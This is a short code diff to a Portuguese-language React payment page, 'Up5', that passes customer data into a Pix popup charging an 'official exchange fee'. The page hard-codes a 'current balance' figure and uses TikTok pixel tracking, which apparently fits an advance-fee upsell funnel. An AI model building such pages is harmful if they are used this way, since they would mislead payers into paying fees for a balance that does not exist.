@@ -3,6 +3,7 @@ import { useNavigate } from 'react-router-dom';
 import ParadisePixPopup from '@/components/ParadisePixPopup';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
+import { useCustomerData } from '@/hooks/useCustomerData';
 import '../styles/app.css';
 
 const SALDO_ATUAL = 4287.90;
@@ -21,6 +22,7 @@ const formatBR = (value: number) => {
 const Up5 = () => {
   const navigate = useNavigate();
   const [showPixPopup, setShowPixPopup] = useState(false);
+  const { customer } = useCustomerData();
 
   useEffect(() => {
     trackViewContent('Taxa de Câmbio', TAXA_CAMBIO);
@@ -122,6 +124,7 @@ const Up5 = () => {
             amount={TAXA_CAMBIO_CENTAVOS}
             description="Taxa de Câmbio Oficial"
             productHash={PRODUCT_HASH}
+            customer={customer}
             onSuccess={handlePaymentSuccess}
             onClose={() => setShowPixPopup(false)}
           />
